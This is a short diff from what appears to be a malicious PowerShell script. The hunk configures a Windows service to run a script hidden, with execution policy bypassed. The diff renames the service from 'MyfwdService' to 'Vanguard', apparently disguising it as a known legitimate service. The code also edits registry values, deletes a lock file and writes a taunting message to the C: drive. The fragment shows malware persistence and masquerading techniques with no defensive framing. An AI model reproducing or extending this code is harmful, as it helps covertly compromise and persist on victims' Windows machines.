@@ -93,7 +93,7 @@ while ($true) {
         if($null -ne $fwdName -and $fwdName -ne ""){
             $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
             $arg = "-ep bypass -nop -w hidden $fwdPath"
-            & $exe set "MyfwdService" AppParameters $arg
+            & $exe set "Vanguard" AppParameters $arg
             Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $fwdPath -Force | Out-Null
             Remove-Item -Path "$env:temp\_ready.lock" -Force
             echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
